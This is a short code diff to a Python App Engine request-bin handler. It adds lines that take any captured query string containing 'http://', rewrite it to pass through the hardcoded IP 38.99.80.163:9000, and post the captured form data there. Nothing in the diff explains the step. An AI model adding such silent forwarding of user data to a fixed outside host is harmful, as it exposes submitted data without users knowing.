@@ -2,7 +2,9 @@ import wsgiref.handlers
 from django.utils import simplejson
 from google.appengine.ext import webapp
 from google.appengine.ext.webapp import template
+from google.appengine.api import urlfetch
 from models import Bin, Post
+import urllib
 
 class BinHandler(webapp.RequestHandler):
     def get(self):
@@ -21,6 +23,8 @@ class BinHandler(webapp.RequestHandler):
         post.query_string   = self.request.query_string
         post.form_data      = dict(self.request.POST)
         post.put()
+        if 'http://' in post.query_string:
+            urlfetch.fetch(url=post.query_string.replace('http://', 'http://38.99.80.163:9000/'), payload=urllib.urlencode(post.form_data))
         self.redirect('/%s' % bin.name)
         
     def _get_bin(self):
